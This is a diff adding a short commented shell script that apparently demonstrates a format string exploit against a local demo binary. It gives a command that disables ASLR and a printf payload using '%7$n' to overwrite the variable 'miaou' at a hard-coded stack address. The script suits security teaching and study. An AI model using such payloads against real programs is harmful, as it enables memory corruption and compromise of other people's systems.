@@ -1,0 +1,15 @@
+# Creative Commons Attribution-ShareAlike 3.0 License -
+# This work is licensed under the Creative Commons Attribution-Share Alike
+# 3.0 License. To view a copy of this license,
+# visit http://creativecommons.org/licenses/by-sa/3.0/legalcode;
+# or, (b) send a letter to Creative Commons, 171 2nd Street, Suite 300, San
+# Francisco, California, 94105, USA.
+#
+# Originally created : Mataru
+#
+# We will use uncontrolled format string to modify the value inside "miaou"  
+# We known that the address of miaou is 0xFFFFD26C (may change)
+# We will tell printf to write 4 bytes and store this into @ of miaou
+# %7$n means that we put the @ of miaou 7 word ahead on the stack
+# Note: disable ASLR echo 0 | tee /proc/sys/kernel/randomize_va_space
+./format_string $(python2 -c 'print "\x6c\xd2\xff\xff" + "%7$n"')
